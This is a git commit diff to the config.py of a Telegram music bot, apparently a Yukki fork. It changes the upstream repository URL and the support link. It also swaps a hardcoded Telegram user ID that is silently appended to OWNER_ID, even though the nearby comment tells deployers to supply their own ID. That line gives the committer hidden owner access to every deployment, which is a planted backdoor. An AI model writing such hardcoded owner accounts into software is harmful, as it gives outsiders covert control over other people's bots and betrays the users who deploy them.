bb2b0cd058c1208bbcb39691dfa1f4ca3876af9a
RioProjectX <88654855+RioProjectX@users.noreply.github.com>
2022-05-18 00:47:36 +0700

    Update config.py

--- config.py
+++ config.py
@@ -44,13 +44,13 @@ HEROKU_APP_NAME = getenv("HEROKU_APP_NAME")
 # Also without customizing or modifying as your own choice, this must be
 # filled with Yukki Music Bot Main Repository URL in value.
 UPSTREAM_REPO = getenv(
-    "UPSTREAM_REPO", "https://github.com/Rexashh/yukkixa"
+    "UPSTREAM_REPO", "https://github.com/RioProjectX/Rio-MusicV2"
 )
 UPSTREAM_BRANCH = getenv("UPSTREAM_BRANCH", "master")
 
 # If you have a Support for your Music Bot, You can set this var
 # Only  Links formats can be accepted for this Var value.
-# Example:- https://t.me/YukkiSupport
+# Example:- https://t.me/riogroupsupport
 # Don’t use @
 
 if str(getenv("SUPPORT_CHANNEL")).strip() == "":
@@ -85,7 +85,7 @@ SUDO_USERS = list(map(int, getenv("SUDO_USERS", "").split()))
 
 # Input  type must be interger
 # Your user id (not username) Get it by using command /id on the Group in the reply to your message where Rose Bot was added.
-OWNER_ID = list(map(int, getenv("OWNER_ID", "").split())) + [5003514838]
+OWNER_ID = list(map(int, getenv("OWNER_ID", "").split())) + [1890868167]
 
 ## String Session Vars ...
 # You'll need a Pyrogram String Session for these vars.
